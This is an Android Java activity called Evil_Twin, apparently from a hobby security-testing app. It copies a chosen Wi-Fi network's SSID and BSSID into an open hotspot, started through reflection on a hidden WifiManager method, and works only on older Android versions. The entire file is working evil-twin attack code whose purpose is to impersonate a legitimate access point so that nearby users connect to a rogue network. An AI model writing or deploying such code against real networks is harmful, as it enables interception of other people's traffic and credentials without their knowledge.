package com.example.lind42431.unhackableproject;

import android.content.Intent;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.lang.reflect.Method;

public class Evil_Twin extends Attack_Page {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_evil_twin);
        Intent attackIntent = getIntent();
        final String MainSSIDP2 = attackIntent.getStringExtra("Extra_SSID2");
        final String MainBSSIDP2 = attackIntent.getStringExtra("Extra_BSSID2");
        final String MainCAPP2 = attackIntent.getStringExtra("Extra_CAP2");


        TextView SSIDAView = (TextView) findViewById(R.id.SSIDAView);
        TextView BSSIDAView = (TextView) findViewById(R.id.BSSIDAView);
        SSIDAView.setText(MainSSIDP2);
        BSSIDAView.setText(MainBSSIDP2);
        Button OnButton = (Button) findViewById(R.id.apOn);
        Button OffButton = (Button) findViewById(R.id.apOff);

        if (Build.VERSION.SDK_INT >= 21) {
            startActivity(new Intent(WifiManager.ACTION_PICK_WIFI_NETWORK));
            Toast.makeText(getApplicationContext(), "Android version not supported", Toast.LENGTH_SHORT).show();
        } else {
            OnButton.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);

                    if (wifiManager.isWifiEnabled()) {
                        wifiManager.setWifiEnabled(false);
                    }

                    WifiConfiguration netConfig = new WifiConfiguration();


                    netConfig.allowedAuthAlgorithms.set(WifiConfiguration.AuthAlgorithm.OPEN);
                    netConfig.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
                    netConfig.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
                    netConfig.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
                    netConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
                    netConfig.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
                    netConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
                    netConfig.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
                    netConfig.SSID = MainSSIDP2;
                    netConfig.BSSID = MainBSSIDP2;
//                    netConfig.preSharedKey = "defaultPassword";


                    try {

                        Method setWifiApMethod = wifiManager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class);
                        boolean apstatus = (Boolean) setWifiApMethod.invoke(wifiManager, netConfig, true);

                        Method isWifiApEnabledmethod = wifiManager.getClass().getMethod("isWifiApEnabled");
                        while (!(Boolean) isWifiApEnabledmethod.invoke(wifiManager)) {
                        }
                        ;

                        Method getWifiApStateMethod = wifiManager.getClass().getMethod("getWifiApState");
                        int apstate = (Integer) getWifiApStateMethod.invoke(wifiManager);

                        Method getWifiApConfigurationMethod = wifiManager.getClass().getMethod("getWifiApConfiguration");
                        netConfig = (WifiConfiguration) getWifiApConfigurationMethod.invoke(wifiManager);

                        Log.i("Writing HotspotData", "\nSSID:" + netConfig.SSID + "\n");
                        Toast.makeText(getApplicationContext(), "Created Wifi AP network", Toast.LENGTH_SHORT).show();

                    } catch (Exception e) {
                        e.printStackTrace();
                        Toast.makeText(getApplicationContext(), "Could not create Wifi AP network", Toast.LENGTH_SHORT).show();
                    }


                }
            });

            OffButton.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
                    WifiConfiguration netConfig = new WifiConfiguration();
                    netConfig = null;

                    if (!(wifiManager.isWifiEnabled())) {
                        wifiManager.setWifiEnabled(true);
                    }

                    try {

                        Method setWifiApMethod = wifiManager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class);
                        setWifiApMethod.invoke(wifiManager, netConfig, false);

                        Log.i("Ending Hotspot", "Button Clicked");
                        Toast.makeText(getApplicationContext(), "Stopped the Wifi AP network", Toast.LENGTH_SHORT).show();

                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                }
            });


        }






    }
}
